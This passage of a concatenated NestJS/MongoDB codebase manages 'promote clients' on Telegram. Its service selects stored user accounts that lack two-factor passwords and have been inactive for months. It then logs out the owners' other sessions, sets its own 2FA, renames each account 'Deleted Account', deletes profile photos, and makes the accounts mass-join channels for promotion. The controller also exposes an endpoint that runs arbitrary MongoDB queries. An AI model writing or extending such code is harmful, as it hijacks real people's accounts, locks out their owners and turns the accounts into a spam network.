Error(`Failed to fetch all documents: ${error.message}`);\n        }\n    }\n\n    async fetchCsrfTokenFromHtml(data) {\n        try {\n            // Step 1: Use a regular expression to match the CSRF token in the <meta> tag\n            const csrfTokenMatch = data.match(/<meta name=\"csrf-token\" content=\"([^\"]+)\"/);\n\n            // Step 2: Check if the CSRF token was found\n            if (!csrfTokenMatch || !csrfTokenMatch[1]) {\n                throw new Error('CSRF token not found in the HTML response.');\n            }\n\n            // Step 3: Extract the CSRF token\n            const csrfToken = csrfTokenMatch[1];\n\n            // Log the CSRF token (optional)\n            console.log('CSRF Token:', csrfToken);\n\n            return csrfToken;\n        } catch (error) {\n            console.error('Error fetching CSRF token:', error);\n        }\n    }\n}","import { ApiProperty } from '@nestjs/swagger';\nimport {  IsNumber, IsString } from 'class-validator';\n\nexport class CreatePromoteClientDto {\n  @ApiProperty({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsString()\n  readonly tgId: string;\n\n  @ApiProperty({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsString()\n  readonly mobile: string;\n\n  @ApiProperty({\n    description: 'Date of the session',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly availableDate: string;\n\n  @ApiProperty({\n    description: 'lastActive identifier',\n    example: '2023-06-22',\n  })\n  @IsString()\n  readonly lastActive: string;\n\n  @ApiProperty({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels: number;\n}\n","import { ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsBoolean, IsOptional, IsNumber } from 'class-validator';\n\nexport class SearchPromoteClientDto {\n  @ApiPropertyOptional({\n    description: 'Telegram ID of the client',\n    example: '123456789',\n  })\n  @IsOptional()\n  @IsString()\n  readonly tgId?: string;\n\n  @ApiPropertyOptional({\n    description: 'Mobile number of the client',\n    example: '+1234567890',\n  })\n  @IsOptional()\n  @IsString()\n  readonly mobile?: string;\n\n  @ApiPropertyOptional({\n    description: 'availableDate of the promoteClient',\n    example: '2023-06-22',\n  })\n  @IsOptional()\n  @IsString()\n  readonly availableDate?: string;\n\n  @ApiPropertyOptional({\n    description: 'Channel Count',\n    example: 23,\n    type: Number\n  })\n  @IsNumber()\n  readonly channels?: number;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteClientDto } from './create-promote-client.dto';\n\nexport class UpdatePromoteClientDto extends PartialType(CreatePromoteClientDto) {}\n","import { Controller, Get, Post, Body, Param, Delete, Query, Patch, Put } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiParam } from '@nestjs/swagger';\nimport { PromoteClientService } from './promote-client.service';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { SearchPromoteClientDto } from './dto/search-promote-client.dto';\nimport { PromoteClient } from './schemas/promote-client.schema';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\n\n@ApiTags('Promote Clients')\n@Controller('promoteclients')\nexport class PromoteClientController {\n  constructor(private readonly clientService: PromoteClientService) { }\n\n  @Post()\n  @ApiOperation({ summary: 'Create user data' })\n  async create(@Body() createClientDto: CreatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.create(createClientDto);\n  }\n\n  @Get('search')\n  @ApiOperation({ summary: 'Search user data' })\n  async search(@Query() query: SearchPromoteClientDto): Promise<PromoteClient[]> {\n    return this.clientService.search(query);\n  }\n\n  @Get('joinChannelsForPromoteClients')\n  @ApiOperation({ summary: 'Join Channels for PromoteClients' })\n  async joinChannelsforPromoteClients(): Promise<string> {\n    return this.clientService.joinchannelForPromoteClients();\n  }\n\n  @Get('checkPromoteClients')\n  @ApiOperation({ summary: 'Check Promote Clients' })\n  async checkpromoteClients(): Promise<string> {\n    this.clientService.checkPromoteClients();\n    return \"initiated Checking\"\n  }\n\n  @Post('addNewUserstoPromoteClients')\n  @ApiOperation({ summary: 'Add New Users to Promote Clients' })\n  @ApiBody({ type: Object })\n  async addNewUserstoPromoteClients(@Body() body: { goodIds: string[], badIds: string[] }): Promise<string> {\n    this.clientService.addNewUserstoPromoteClients(body.badIds, body.goodIds);\n    return \"initiated Checking\"\n  }\n\n  @Get()\n  @ApiOperation({ summary: 'Get all user data' })\n  async findAll(): Promise<PromoteClient[]> {\n    return this.clientService.findAll();\n  }\n\n  @Get('SetAsPromoteClient/:mobile')\n  @ApiOperation({ summary: 'Set as Promote Client' })\n  @ApiParam({ name: 'mobile', description: 'User mobile number', type: String })\n  async setAsPromoteClient(\n    @Param('mobile') mobile: string,\n  ) {\n    return await this.clientService.setAsPromoteClient(mobile);\n  }\n\n  @Get(':mobile')\n  @ApiOperation({ summary: 'Get user data by ID' })\n  async findOne(@Param('mobile') mobile: string): Promise<PromoteClient> {\n    return this.clientService.findOne(mobile);\n  }\n\n  @Patch(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async update(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.update(mobile, updateClientDto);\n  }\n\n  @Put(':mobile')\n  @ApiOperation({ summary: 'Update user data by ID' })\n  async createdOrupdate(@Param('mobile') mobile: string, @Body() updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n    return this.clientService.createOrUpdate(mobile, updateClientDto);\n  }\n\n  @Delete(':mobile')\n  @ApiOperation({ summary: 'Delete user data by ID' })\n  async remove(@Param('mobile') mobile: string): Promise<void> {\n    return this.clientService.remove(mobile);\n  }\n\n  @Post('query')\n  @ApiOperation({ summary: 'Execute a custom MongoDB query' })\n  @ApiBody({ type: Object })\n  async executeQuery(@Body() query: object): Promise<any> {\n    try {\n      return await this.clientService.executeQuery(query);\n    } catch (error) {\n      throw error;  // You might want to handle errors more gracefully\n    }\n  }\n\n}\n","import { Module, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteClientService } from './promote-client.service';\nimport { PromoteClientController } from './promote-client.controller';\nimport { PromoteClientSchema } from './schemas/promote-client.schema';\nimport { TelegramModule } from '../Telegram/Telegram.module';\nimport { ActiveChannelsModule } from '../active-channels/active-channels.module';\nimport { UsersModule } from '../users/users.module';\nimport { ClientModule } from '../clients/client.module';\nimport { initModule } from '../ConfigurationInit/init.module';\nimport { ChannelsModule } from '../channels/channels.module';\nimport { BufferClientModule } from '../buffer-clients/buffer-client.module';\n\n@Module({\n  imports: [\n    initModule,\n    MongooseModule.forFeature([{ name: 'promoteClientModule', schema: PromoteClientSchema, collection: 'promoteClients' }]),\n    forwardRef(() => TelegramModule),\n    forwardRef(() => UsersModule),\n    forwardRef(() => ActiveChannelsModule),\n    forwardRef(() => ClientModule),\n    forwardRef(() => ChannelsModule),\n    forwardRef(() => BufferClientModule),\n ],\n  controllers: [PromoteClientController],\n  providers: [PromoteClientService],\n  exports: [PromoteClientService]\n})\nexport class PromoteClientModule { }\n","import { ChannelsService } from '../channels/channels.service';\nimport { Channel } from '../channels/schemas/channel.schema';\nimport { BadRequestException, ConflictException, HttpException, Inject, Injectable, InternalServerErrorException, Logger, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteClientDto } from './dto/create-promote-client.dto';\nimport { PromoteClient, PromoteClientDocument } from './schemas/promote-client.schema';\nimport { TelegramService } from '../Telegram/Telegram.service';\nimport { sleep } from 'telegram/Helpers';\nimport { UsersService } from '../users/users.service';\nimport { ActiveChannelsService } from '../active-channels/active-channels.service';\nimport { ClientService } from '../clients/client.service';\nimport { UpdatePromoteClientDto } from './dto/update-promote-client.dto';\nimport { BufferClientService } from '../buffer-clients/buffer-client.service';\nimport { parseError } from '../../utils/parseError';\nimport { fetchWithTimeout } from '../../utils/fetchWithTimeout';\nimport { notifbot } from '../../utils/logbots';\n@Injectable()\nexport class PromoteClientService {\n    private readonly logger = new Logger(PromoteClientService.name);\n    private joinChannelMap: Map<string, Channel[]> = new Map();\n    private joinChannelIntervalId: NodeJS.Timeout;\n    private leaveChannelMap: Map<string, string[]> = new Map();\n    private leaveChannelIntervalId: NodeJS.Timeout;\n    private isLeaveChannelProcessing: boolean = false;\n    private isJoinChannelProcessing: boolean = false;\n    private readonly JOIN_CHANNEL_INTERVAL = 4 * 60 * 1000; // 4 minutes\n    constructor(@InjectModel('promoteClientModule') private promoteClientModel: Model<PromoteClientDocument>,\n        @Inject(forwardRef(() => TelegramService))\n        private telegramService: TelegramService,\n        @Inject(forwardRef(() => UsersService))\n        private usersService: UsersService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private activeChannelsService: ActiveChannelsService,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n        @Inject(forwardRef(() => ActiveChannelsService))\n        private channelsService: ChannelsService,\n        @Inject(forwardRef(() => BufferClientService))\n        private bufferClientService: BufferClientService,\n    ) {}\n\n    async create(promoteClient: CreatePromoteClientDto): Promise<PromoteClient> {\n        const newUser = new this.promoteClientModel(promoteClient);\n        return newUser.save();\n    }\n\n    async findAll(): Promise<PromoteClient[]> {\n        return this.promoteClientModel.find().exec();\n    }\n\n    async findOne(mobile: string, throwErr: boolean = true): Promise<PromoteClient> {\n        const user = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (!user && throwErr) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n        return user;\n    }\n\n\n    async update(mobile: string, updateClientDto: UpdatePromoteClientDto): Promise<PromoteClient> {\n        const updatedUser = await this.promoteClientModel.findOneAndUpdate(\n            { mobile },\n            { $set: updateClientDto },\n            { new: true, upsert: true, returnDocument: 'after' }\n        ).exec();\n\n        if (!updatedUser) {\n            throw new NotFoundException(`User with mobile ${mobile} not found`);\n        }\n\n        return updatedUser;\n    }\n\n    async createOrUpdate(mobile: string, createOrUpdateUserDto: CreatePromoteClientDto | UpdatePromoteClientDto): Promise<PromoteClient> {\n        const existingUser = (await this.promoteClientModel.findOne({ mobile }).exec())?.toJSON();\n        if (existingUser) {\n            console.log(\"Updating\")\n            return this.update(existingUser.mobile, createOrUpdateUserDto as UpdatePromoteClientDto);\n        } else {\n            console.log(\"creating\")\n            return this.create(createOrUpdateUserDto as CreatePromoteClientDto);\n        }\n    }\n\n    async remove(mobile: string): Promise<void> {\n        await fetchWithTimeout(`${notifbot()}&text=${encodeURIComponent(`Deleting Promote Client : ${mobile}`)}`);\n        const result = await this.promoteClientModel.deleteOne({ mobile }).exec();\n        if (result.deletedCount === 0) {\n            throw new NotFoundException(`PromoteClient with mobile ${mobile} not found`);\n        }\n    }\n    async search(filter: any): Promise<PromoteClient[]> {\n        console.log(filter)\n        if (filter.firstName) {\n            filter.firstName = { $regex: new RegExp(filter.firstName, 'i') }\n        }\n        console.log(filter)\n        return this.promoteClientModel.find(filter).exec();\n    }\n\n    async executeQuery(query: any, sort?: any, limit?: number, skip?: number): Promise<PromoteClient[]> {\n        try {\n\n            if (!query) {\n                throw new BadRequestException('Query is invalid.');\n            }\n            const queryExec = this.promoteClientModel.find(query);\n            if (sort) {\n                queryExec.sort(sort);\n            }\n\n            if (limit) {\n                queryExec.limit(limit);\n            }\n\n            if (skip) {\n                queryExec.skip(skip);\n            }\n\n            return await queryExec.exec();\n        } catch (error) {\n            throw new InternalServerErrorException(error.message);\n        }\n    }\n\n    removeFromPromoteMap(key: string) {\n        this.joinChannelMap.delete(key)\n    }\n    clearPromoteMap() {\n        console.log(\"PromoteMap cleared\")\n        this.joinChannelMap.clear()\n    }\n\n    async joinchannelForPromoteClients(skipExisting: boolean = true): Promise<string> {\n        if (!this.telegramService.getActiveClientSetup()) {\n            this.logger.log('Starting join channel process');\n\n            // Clear both queues before starting new process\n            this.clearJoinChannelInterval();\n            this.clearLeaveChannelInterval();\n\n            try {\n                const existingkeys = skipExisting ? [] : Array.from(this.joinChannelMap.keys());\n                this.logger.debug(`Using existing keys: ${existingkeys.join(', ')}`);\n\n                await this.telegramService.disconnectAll();\n                await sleep(2000);\n\n                const clients = await this.promoteClientModel.find({\n                    channels: { \"$lt\": 250 },\n                    mobile: { $nin: existingkeys }\n                }).sort({ channels: 1 }).limit(4);\n\n                this.logger.debug(`Found ${clients.length} clients to process`);\n\n                if (clients.length > 0) {\n                    for (const document of clients) {\n                        try {\n                            this.logger.debug(`Processing client: ${document.mobile}`);\n                            const client = await this.telegramService.createClient(document.mobile, false, false);\n\n                            const channels = await client.channelInfo(true);\n                            this.logger.debug(`${document.mobile}: Found ${channels.ids.length} existing channels`);\n\n                            await this.update(document.mobile, { channels: channels.ids.length });\n\n                            if (channels.canSendFalseCount < 10) {\n                                if (channels.ids.length < 220) {\n                                    this.logger.debug(`${document.mobile}: Getting channels from channels service`);\n                                    const result = await this.channelsService.getActiveChannels(150, 0, channels.ids);\n                                    this.joinChannelMap.set(document.mobile, result);\n                                    this.joinChannelQueue();\n                                } else {\n                                    this.logger.debug(`${document.mobile}: Getting channels from active channels service`);\n                                    const result = await this.activeChannelsService.getActiveChannels(150, 0, channels.ids);\n                                    this.joinChannelMap.set(document.mobile, result);\n                                    this.joinChannelQueue();\n                                }\n                            } else {\n                                this.logger.debug(`${document.mobile}: Too many channels with no send permissions, queueing for leave: ${channels.canSendFalseChats.length}`);\n                                this.leaveChannelMap.set(document.mobile, channels.canSendFalseChats);\n                                this.leaveChannelQueue();\n                            }\n                        } catch (error) {\n                            const errorDetails = parseError(error);\n                            this.logger.error(`Error processing client ${document.mobile}:`, errorDetails);\n\n                            if (error.message === \"SESSION_REVOKED\" ||\n                                error.message === \"AUTH_KEY_UNREGISTERED\" ||\n                                error.message === \"USER_DEACTIVATED\" ||\n                                error.message === \"USER_DEACTIVATED_BAN\") {\n                                this.logger.warn(`${document.mobile}: Session invalid, removing client`);\n                                await this.remove(document.mobile);\n                            }\n                        } finally {\n                            await this.telegramService.deleteClient(document.mobile);\n                        }\n                    }\n                }\n\n                this.logger.log(`Join channel process triggered successfully for ${clients.length} clients`);\n                return `Initiated Joining channels for ${clients.length}`;\n            } catch (error) {\n                this.logger.error('Error during joinchannelForPromoteClients:', error);\n                // Clean up on error\n                this.clearJoinChannelInterval();\n                this.clearLeaveChannelInterval();\n                throw new Error(\"Failed to initiate channel joining process\");\n            }\n        } else {\n            this.logger.warn('Ignored active check for promote channels as an active client setup exists');\n            return \"Active client setup exists, skipping promotion\";\n        }\n    }\n\n    async joinChannelQueue() {\n        if (this.isJoinChannelProcessing || this.joinChannelIntervalId) {\n            this.logger.warn('Join channel process is already running, instance:', this.joinChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.joinChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to join, skipping queue');\n            return;\n        }\n\n        this.isJoinChannelProcessing = true;\n        this.joinChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.joinChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.log('Join channel map is empty, clearing interval');\n                    this.clearJoinChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Join channel interval processing timeout');\n                    this.clearJoinChannelInterval();\n                }, this.JOIN_CHANNEL_INTERVAL - 1000);\n\n                this.logger.debug(`Processing join channel interval at ${new Date().toISOString()}`);\n\n                for (const mobile of keys) {\n                    const channels = this.joinChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No more channels to join for ${mobile}, removing from map`);\n                        this.removeFromPromoteMap(mobile);\n                        continue;\n                    }\n\n                    const channel = channels.shift();\n                    // Only update map if there are remaining channels\n                    if (channels.length > 0) {\n                        this.logger.debug(`${mobile}: Pending channels to join: ${channels.length}`);\n                        this.joinChannelMap.set(mobile, channels);\n                    } else {\n                        this.removeFromPromoteMap(mobile);\n                    }\n\n                    try {\n                        await this.telegramService.createClient(mobile, false, false);\n                        this.logger.debug(`${mobile}: Attempting to join channel: @${channel.username}`);\n                        await this.telegramService.tryJoiningChannel(mobile, channel);\n                    } catch (error) {\n                        const errorDetails = parseError(error, `${mobile} @${channel.username} Outer Err ERR: `, false);\n                        this.logger.error(`${mobile}: Error joining @${channel.username}:`, errorDetails);\n\n                        if (errorDetails.error === 'FloodWaitError' || error.errorMessage === 'CHANNELS_TOO_MUCH') {\n                            this.logger.warn(`${mobile}: FloodWaitError or too many channels, handling...`);\n                            this.removeFromPromoteMap(mobile);\n                            const channelsInfo = await this.telegramService.getChannelInfo(mobile, true);\n                            await this.update(mobile, { channels: channelsInfo.ids.length });\n                        }\n                        if (error.errorMessage === \"SESSION_REVOKED\" ||\n                            error.errorMessage === \"AUTH_KEY_UNREGISTERED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED\" ||\n                            error.errorMessage === \"USER_DEACTIVATED_BAN\") {\n                            this.logger.error(`Session invalid for ${mobile}, removing client`);\n                            await this.remove(mobile);\n                        }\n                    } finally {\n                        await this.telegramService.deleteClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in join channel interval:', error);\n                this.clearJoinChannelInterval();\n            }\n        }, this.JOIN_CHANNEL_INTERVAL);\n\n        this.logger.debug(`Started join channel queue with interval ID: ${this.joinChannelIntervalId}`);\n    }\n\n    clearJoinChannelInterval() {\n        if (this.joinChannelIntervalId) {\n            this.logger.debug('Clearing join channel interval');\n            clearInterval(this.joinChannelIntervalId);\n            this.joinChannelIntervalId = null;\n            this.isJoinChannelProcessing = false;\n\n            // Only schedule next run if there are items in the map\n            if (this.joinChannelMap.size > 0) {\n                setTimeout(() => {\n                    this.logger.debug('Triggering join channel process after timeout');\n                    this.joinchannelForPromoteClients(false);\n                }, 30000);\n            }\n        }\n    }\n\n    removeFromLeaveMap(key: string) {\n        this.logger.debug(`Removing mobile ${key} from leave map`);\n        this.leaveChannelMap.delete(key);\n        if (this.leaveChannelMap.size === 0) {\n            this.logger.log('Leave map is now empty');\n            this.clearLeaveChannelInterval();\n        }\n    }\n\n    clearLeaveMap() {\n        this.logger.debug('Clearing entire leave map');\n        this.leaveChannelMap.clear();\n        this.clearLeaveChannelInterval();\n    }\n\n    async leaveChannelQueue() {\n        if (this.isLeaveChannelProcessing || this.leaveChannelIntervalId) {\n            this.logger.warn('Leave channel process is already running, instance:', this.leaveChannelIntervalId);\n            return;\n        }\n\n        const existingKeys = Array.from(this.leaveChannelMap.keys());\n        if (existingKeys.length === 0) {\n            this.logger.debug('No channels to leave, not starting queue');\n            return;\n        }\n\n        this.isLeaveChannelProcessing = true;\n        this.leaveChannelIntervalId = setInterval(async () => {\n            try {\n                const keys = Array.from(this.leaveChannelMap.keys());\n                if (keys.length === 0) {\n                    this.logger.debug('Leave map is empty, clearing interval');\n                    this.clearLeaveChannelInterval();\n                    return;\n                }\n\n                // Add timeout to prevent infinite processing\n                const processTimeout = setTimeout(() => {\n                    this.logger.error('Leave channel interval processing timeout');\n                    this.clearLeaveChannelInterval();\n                }, 60000 - 1000);\n\n                this.logger.debug(`Processing leave channel queue at ${new Date().toISOString()}, ${keys.length} clients remaining, interval:${this.leaveChannelIntervalId}`);\n\n                for (const mobile of keys) {\n                    this.logger.debug(`Processing leave channels for mobile: ${mobile}`);\n                    const channels = this.leaveChannelMap.get(mobile);\n                    if (!channels || channels.length === 0) {\n                        this.logger.debug(`No channels to leave for mobile: ${mobile}`);\n                        this.removeFromLeaveMap(mobile);\n                        continue;\n                    }\n\n                    const channelsToProcess = channels.splice(0, 10);\n\n                    // Only update map if there are remaining channels\n                    if (channels.length > 0) {\n                        this.logger.debug(`${mobile}: Processing ${channelsToProcess.length} channels, ${channels.length} remaining`);\n                        this.leaveChannelMap.set(mobile, channels);\n                    } else {\n                        this.removeFromLeaveMap(mobile);\n                    }\n\n                    try {\n                        const client = await this.telegramService.createClient(mobile, false, false);\n                        this.logger.debug(`${mobile}: Attempting to leave ${channelsToProcess.length} channels`);\n                        await client.leaveChannels(channelsToProcess);\n                        this.logger.debug(`${mobile}: Successfully left ${channelsToProcess.length} channels`);\n                    } catch (error) {\n                        const errorDetails = parseError(error);\n                        this.logger.error(`Error in leave channel process for ${mobile}:`, errorDetails);\n                        if (\n                            errorDetails.message === \"SESSION_REVOKED\" ||\n                            errorDetails.message === \"AUTH_KEY_UNREGISTERED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED\" ||\n                            errorDetails.message === \"USER_DEACTIVATED_BAN\"\n                        ) {\n                            this.logger.warn(`${mobile}: Session invalid, removing client`);\n                            await this.remove(mobile);\n                            this.removeFromLeaveMap(mobile);\n                        }\n                    } finally {\n                        await this.telegramService.deleteClient(mobile);\n                    }\n                }\n\n                clearTimeout(processTimeout);\n            } catch (error) {\n                this.logger.error('Error in leave channel interval:', error);\n                this.clearLeaveChannelInterval();\n            }\n        }, 60000);\n\n        this.logger.debug(`Started leave channel queue with interval ID: ${this.leaveChannelIntervalId}`);\n    }\n\n    clearLeaveChannelInterval() {\n        if (this.leaveChannelIntervalId) {\n            this.logger.debug(`Clearing leave channel interval: ${this.leaveChannelIntervalId}`);\n            clearInterval(this.leaveChannelIntervalId);\n            this.leaveChannelIntervalId = null;\n        }\n        this.isLeaveChannelProcessing = false;\n        this.logger.debug('Leave channel interval cleared and processing flag reset');\n    }\n\n    async setAsPromoteClient(\n        mobile: string,\n        availableDate: string = (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0]\n    ) {\n        const user = (await this.usersService.search({ mobile, expired: false }))[0];\n        if (!user) {\n            throw new BadRequestException('user not found');\n        }\n        const isExist = await this.findOne(mobile, false)\n        if (isExist) {\n            throw new ConflictException('PromoteClient already exist');\n        }\n        const clients = await this.clientService.findAll();\n        const clientMobiles = clients.map(client => client?.mobile);\n        const clientPromoteMobiles = clients.flatMap(client => client?.promoteMobile);\n        if (!clientMobiles.includes(mobile) && !clientPromoteMobiles.includes(mobile)) {\n            const telegramClient = await this.telegramService.createClient(mobile, false)\n            try {\n                await telegramClient.set2fa();\n                await sleep(15000)\n                await telegramClient.updateUsername('');\n                await sleep(3000)\n                await telegramClient.updatePrivacyforDeletedAccount();\n                await sleep(3000)\n                await telegramClient.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                await sleep(3000)\n                await telegramClient.deleteProfilePhotos();\n                const channels = await this.telegramService.getChannelInfo(mobile, true)\n                const promoteClient = {\n                    tgId: user.tgId,\n                    lastActive: \"default\",\n                    mobile: user.mobile,\n                    availableDate,\n                    channels: channels.ids.length,\n                }\n                await this.promoteClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: promoteClient }, { new: true, upsert: true }).exec();\n            } catch (error) {\n                const errorDetails = parseError(error)\n                throw new HttpException(errorDetails.message, errorDetails.status)\n            }\n            await this.telegramService.deleteClient(mobile)\n            return \"Client set as promote successfully\";\n        } else {\n            throw new BadRequestException(\"Number is a Active Client\")\n        }\n    }\n\n    async checkPromoteClients() {\n        if (!this.telegramService.getActiveClientSetup()) {\n            await this.telegramService.disconnectAll()\n            await sleep(2000);\n            const promoteclients = await this.findAll();\n            let goodIds: string[] = [];\n            const badIds: string[] = [];\n            if (promoteclients.length < 80) {\n                for (let i = 0; i < 80 - promoteclients.length && badIds.length < 4; i++) {\n                    badIds.push(i.toString())\n                }\n            }\n            const clients = await this.clientService.findAll();\n            const bufferClients = await this.bufferClientService.findAll();\n            const clientIds = [...clients.map(client => client.mobile), ...clients.flatMap(client => { return (client.promoteMobile) })]\n            const bufferClientIds = bufferClients.map(client => client.mobile);\n            const today = (new Date(Date.now())).toISOString().split('T')[0];\n            for (const document of promoteclients) {\n                if (!clientIds.includes(document.mobile) && !bufferClientIds.includes(document.mobile)) {\n                    try {\n                        const cli = await this.telegramService.createClient(document.mobile, true, false);\n                        const me = await cli.getMe();\n                        if (me.username) {\n                            await this.telegramService.updateUsername(document.mobile, '');\n                            await sleep(2000);\n                        }\n                        if (me.firstName !== \"Deleted Account\") {\n                            await this.telegramService.updateNameandBio(document.mobile, 'Deleted Account', '');\n                            await sleep(2000);\n                            // await this.telegramService.updatePrivacyforDeletedAccount(document.mobile);\n                        }\n                        await this.telegramService.deleteProfilePhotos(document.mobile);\n                        const hasPassword = await cli.hasPassword();\n                        if (!hasPassword && badIds.length < 4) {\n                            console.log(\"Client does not have password\");\n                            badIds.push(document.mobile);\n                            // await this.remove(document.mobile);\n                        } else {\n                            // const channelinfo = await this.telegramService.getChannelInfo(document.mobile, true);\n                            // await this.promoteClientModel.findOneAndUpdate({ mobile: document.mobile }, { channels: channelinfo.ids.length })\n                            console.log(document.mobile, \" :  ALL Good\");\n                            goodIds.push(document.mobile)\n                        }\n                        await this.telegramService.removeOtherAuths(document.mobile);\n                        await sleep(2000);\n                        await this.telegramService.deleteClient(document.mobile)\n                    } catch (error) {\n                        parseError(error);\n                        badIds.push(document.mobile);\n                        this.remove(document.mobile);\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } else {\n                    console.log(\"Number is a Active Client\");\n                    goodIds.push(document.mobile)\n                    this.remove(document.mobile)\n                }\n            }\n            goodIds = [...goodIds, ...clientIds, ...bufferClientIds]\n            console.log(\"GoodIds: \", goodIds.length, \"BadIds : \", badIds.length);\n            this.addNewUserstoPromoteClients(badIds, goodIds);\n        } else {\n            console.log(\"ignored active check promote channels as active client setup exists\")\n        }\n    }\n\n    async addNewUserstoPromoteClients(badIds: string[], goodIds: string[]) {\n        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];\n        const documents = await this.usersService.executeQuery({ \"mobile\": { $nin: goodIds }, twoFA: false, expired: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 250 } }, { tgId: 1 }, badIds.length + 3);\n        console.log(\"New promote documents to be added: \", documents.length)\n        while (badIds.length > 0 && documents.length > 0) {\n            const document = documents.shift();\n            try {\n                try {\n                    const client = await this.telegramService.createClient(document.mobile, false);\n                    const hasPassword = await client.hasPassword();\n                    console.log(\"hasPassword: \", hasPassword);\n                    if (!hasPassword) {\n                        await client.removeOtherAuths();\n                        await client.set2fa();\n                        console.log(\"waiting for setting 2FA\");\n                        await sleep(30000);\n                        await client.updateUsername('');\n                        await sleep(3000)\n                        await client.updatePrivacyforDeletedAccount();\n                        await sleep(3000)\n                        await client.updateProfile(\"Deleted Account\", \"Deleted Account\");\n                        await sleep(3000)\n                        await client.deleteProfilePhotos();\n                        const channels = await client.channelInfo(true)\n                        console.log(\"Inserting Document\");\n                        const promoteClient = {\n                            tgId: document.tgId,\n                            lastActive: \"today\",\n                            mobile: document.mobile,\n                            availableDate: (new Date(Date.now() - (24 * 60 * 60 * 1000))).toISOString().split('T')[0],\n                            channels: channels.ids.length,\n                        }\n                        await this.create(promoteClient);\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        console.log(\"=============Created PromoteClient=============\")\n                        await this.telegramService.deleteClient(document.mobile)\n                        badIds.pop();\n                    } else {\n                        console.log(\"Failed to Update as PromoteClient has Password\");\n                        await this.usersService.update(document.tgId, { twoFA: true })\n                        await this.telegramService.deleteClient(document.mobile)\n                    }\n                } catch (error) {\n                    parseError(error)\n                    await this.telegramService.deleteClient(document.mobile)\n                }\n            } catch (error) {\n                parseError(error)\n                console.error(\"An error occurred:\", error);\n            }\n            await this.telegramService.deleteClient(document.mobile)\n        }\n        setTimeout(() => {\n            this.joinchannelForPromoteClients()\n        }, 2 * 60 * 1000);\n    }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document } from 'mongoose';\n\nexport type PromoteClientDocument = PromoteClient & Document;\n@Schema({ collection: 'promoteClients', versionKey: false, autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})  // Specify the collection name here\nexport class PromoteClient {\n  @Prop({ required: true})\n  tgId: string;\n\n  @Prop({ required: true, unique: true })\n  mobile: string;\n  \n  @Prop({ required: true })\n  lastActive: string;\n\n  @Prop({ required: true })\n  availableDate: string;\n\n  @Prop({ required: true, type: Number })\n  channels: number;\n}\n\nexport const PromoteClientSchema = SchemaFactory.createForClass(PromoteClient);\n","import { Controller, Get, Body, Param, Patch } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody } from '@nestjs/swagger';\nimport { PromoteMsgsService } from './promote-msgs.service';\n\n@ApiTags('Promote-msgs')\n@Controller('promote-msgs')\nexport class PromoteMsgsController {\n  constructor(private readonly promoteMsgsService: PromoteMsgsService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get promote-msgs data' })\n  async findOne(): Promise<any>{\n    return this.promoteMsgsService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update promote-msgs' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.promoteMsgsService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteMsgsService } from './promote-msgs.service';\nimport { PromoteMsgsController } from './promote-msgs.controller';\nimport { PromoteMsgSchema } from './promote-msgs.schema';\n\n@Global()\n@Module({\n  imports: [\n    PromoteMsgModule,\n    MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: PromoteMsgSchema }]),\n  ],\n  providers: [PromoteMsgsService],\n  controllers: [PromoteMsgsController],\n  exports: [PromoteMsgsService],\n})\nexport class PromoteMsgModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type PromoteMsgDocument = PromoteMsg & Document;\n\n@Schema({versionKey: 